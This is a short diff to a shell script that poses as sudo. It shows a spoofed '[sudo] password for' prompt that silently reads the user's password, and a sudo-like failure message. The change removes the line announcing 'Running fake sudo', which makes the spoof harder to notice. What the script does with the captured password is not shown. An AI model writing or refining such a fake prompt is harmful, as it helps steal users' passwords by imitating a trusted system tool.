@@ -2,10 +2,9 @@ readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
 
 
 MAXIMUM_ATTEMPTS=3
-readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"
+readonly ERROR_MESSAGE="-> sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"
 
 attempts() {
-    echo "Running fake sudo"
     echo -n "${INPUT_MESSAGE}"
     read -r -s sudo_password
     echo ""
